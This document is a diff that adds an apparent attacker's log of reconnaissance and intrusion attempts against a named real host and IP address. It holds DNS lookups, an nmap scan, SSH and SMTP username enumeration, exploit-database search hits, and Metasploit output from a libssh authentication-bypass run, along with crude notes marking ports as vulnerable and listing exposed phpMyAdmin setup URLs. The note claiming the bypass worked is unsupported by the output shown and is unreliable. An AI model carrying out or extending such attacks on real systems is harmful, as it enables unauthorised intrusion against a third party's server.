@@ -1,0 +1,75 @@
+Host's addresses:
+__________________
+
+teenxporn.xxxtop.biz.                    86384    IN    A        162.244.35.13
+
+
+Wildcard detection using: rcvvjvlulnns
+_______________________________________
+
+rcvvjvlulnns.teenxporn.xxxtop.biz.       86400    IN    A        162.244.35.13
+======================================================================================
+
+
+
+Nmap scan report for teenxporn.xxxtop.biz (162.244.35.13)
+Host is up (0.27s latency).
+rDNS record for 162.244.35.13: xnlog.com
+Not shown: 990 closed ports
+PORT    STATE    SERVICE     VERSION
+19/tcp  filtered chargen
+22/tcp  open     ssh         OpenSSH 7.2 (FreeBSD 20160310; protocol 2.0)
+25/tcp  open     smtp        Sendmail 8.15.2/8.15.2
+53/tcp  open     domain      ISC BIND 9.10.6
+80/tcp  open     http        nginx
+111/tcp filtered rpcbind
+135/tcp filtered msrpc
+139/tcp filtered netbios-ssn
+222/tcp open     ssh         OpenSSH 7.2 (FreeBSD 20160310; protocol 2.0)
+587/tcp open     smtp        Sendmail 8.15.2/8.15.2
+Service Info: Host: DS791847.clientshostname.com; OSs: FreeBSD, Unix; CPE: cpe:/o:freebsd:freebsd
+
+port 22 (SSH) VULNERABLE AS FUCK                                                                      
+[+] 162.244.35.13:22 - SSH - User 'mysql' found
+[+] 162.244.35.13:22 - SSH - User 'nobody' found
+[+] 162.244.35.13:22 - SSH - User 'root' found
+[+] 162.244.35.13:22 - SSH - User 'user' found
+
+OpenSSH 7.2 - Denial of Service                                                                                 | exploits/linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                         | exploits/multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                                                            | exploits/linux/remote/40136.py
+OpenSSHd 7.2p2 - Username Enumeration                                                                           | exploits/linux/remote/40113.txt
+CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
+
+ RUNNING LIBSSH AUTH BYPASS EXPLOIT CVE-2018-10933 
+====================================================================================•x[2020-02-24](15:58)x•
+RHOSTS => teenxporn.xxxtop.biz
+RHOST => teenxporn.xxxtop.biz
+LHOST => 127.0.0.1
+LPORT => 4444
+[*] 162.244.35.13:22 - Attempting authentication bypass
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+(this worked means we can bypass the authentication)
+PORT 25  (smtp) VUln
+ 162.244.35.13:25      - 162.244.35.13:25 Users found: bin, daemon, ftp, games, man, news, nobody, operator, postmaster, proxy, sshd, user, uucp, www
+
+HPMailer Sendmail Argument Injection
+/usr/share/findsploit/msf_search/exploits:   685   solaris/lpd/sendmail_exec                                         2001-08-31       excellent  No     Solaris LPD Command Execution
+/usr/share/findsploit/msf_search/exploits:   732   unix/smtp/morris_sendmail_debug                                   1988-11-02       average    Yes    Morris Worm sendmail Debug Mode Shell Escape
+
+(can reset server and mailing)
+
+
+PhpMyAdmin Setup Page:
+
+http://162.244.35.13/phpmyadmin/setup/index.php
+
+phpMyAdmin readme :
+
+http://162.244.35.13/phpmyadmin/README    
+
+
+
+
+ 
